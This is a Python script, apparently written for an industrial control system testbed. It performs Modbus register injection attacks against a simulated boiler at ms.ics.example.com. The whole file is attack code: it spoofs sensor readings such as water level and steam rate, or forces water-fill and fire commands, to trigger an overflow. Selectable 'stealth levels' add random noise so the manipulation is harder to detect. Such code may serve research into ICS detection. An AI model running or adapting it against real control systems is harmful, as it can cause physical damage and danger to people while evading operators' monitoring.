import random
import time
import NetworkEncoder as ne
from pymodbus.client.sync import ModbusTcpClient

MODBUS_SLAVE = 'ms.ics.example.com'
client = ModbusTcpClient(MODBUS_SLAVE)

def readRegisters():
    # Read values from slave
    client = ModbusTcpClient(MODBUS_SLAVE)
    result = client.read_holding_registers(0, 21, unit=1)
    addWater = ne.modbusDecode(0, 2, 2, result.registers)
    addFire = ne.modbusDecode(2, 2, 0, result.registers)
    waterLevel = ne.modbusDecode(3, 4, 4, result.registers)
    waterTemp = ne.modbusDecode(7, 2, 2, result.registers)
    powerOut = ne.modbusDecode(9, 6, 2, result.registers)
    steamStep = ne.modbusDecode(13, 2, 4, result.registers)
    powerIn = ne.modbusDecode(16, 6, 2, result.registers)
    serverSeconds = ne.modbusDecode(20, 2, 0, result.registers)

    return addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds

response = ''
print("Sensors online, enter injection attack type:")
print("[r]esponse - Fake slave values to trigger overflow")
print("[c]ommand  - Fake master values to trigger overflow")
print("[q]uit")

while not response == 'r' and not response == 'c' and not response == 'q':
    response = raw_input('>')

if response == 'q':
    exit(0)

packetCount = 0
packetSend = 10000
if response == 'r':
    print("Enter stealth level:")
    print("[1] - Blatantly obvious")
    print("[2] - Plausible")
    print("[3] - Harder to detect")
    print("[4] - Hard to detect")
    print("[q]uit")

    while not response == '1' and not response == '2' and not response == '3' and not response == '4' and not response == 'q':
        response = raw_input('>')

    if response == 'q':
        exit(0)
    response = int(response)

    while serverSeconds < 7200:
        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
        if response == 1:
            # 2,000L below optimal level
            waterLevel = 500000 - 2000
        if response == 2:
            # 1,000L below optimal level
            waterLevel = 500000 - 1000
            steamStep *= 1.5
        if response == 3:
            # Constantly 1,000L below optimum level +- 15%
            waterLevel = 500000 - (1000 * (float(random.randint(85, 115)) / 100))
        if response == 4:
            # Constantly 1,000L below optimum level +- 15% + steamStep
            waterLevel = 500000 - (1000 * (float(random.randint(85, 115)) / 100)) + steamStep
            steamStep += random.randint(275, 300)

        outputs = []
        outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
        outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
        outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
        outputs = ne.modbusEncode(steamStep, 2, 4, outputs)
        outputs = ne.modbusEncode(powerIn, 6, 2, outputs)

        write = client.write_registers(3, outputs, unit=1)
        print(packetCount)
        packetCount += 1
        client.close()

if response == 'c':
    print("Enter stealth level:")
    print("[1] - Blatantly obvious")
    print("[2] - Plausible")
    print("[3] - Harder to detect")
    print("[4] - Hard to detect")
    print("[q]uit")

    while not response == '1' and not response == '2' and not response == '3' and not response == '4' and not response == 'q':
        response = raw_input('>')

    if response == 'q':
        exit(0)

    response = int(response)
    while packetCount < packetSend:
        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
        if response == 1:
            # 1,500L constant fill, no fire
            addWater = 1500
            addFire = 0
        if response == 2:
            # 1,500L constant fill, current fire state
            addWater = 1500
        if response == 3:
            # 1,500L constant fill +- 10%, current fire state
            addWater = 1500 * (random.randint(90, 110) / 100)
        if response == 4:
            # Add water value + 0-5%, if no fire, + 5-10% if fire
            if addFire:
                addWater = 500 + (addWater * (random.randint(105, 110) / 100))
            else:
                addWater = 500 + (addWater * (random.randint(100, 105) / 100))

        outputs = []
        outputs = ne.modbusEncode(addWater, 2, 2, outputs)
        outputs = ne.modbusEncode(addFire, 2, 0, outputs)
        write = client.write_registers(0, outputs, unit=1)
        packetCount += 1
        print(packetCount)
        client.close()
    exit(0)

client.close()

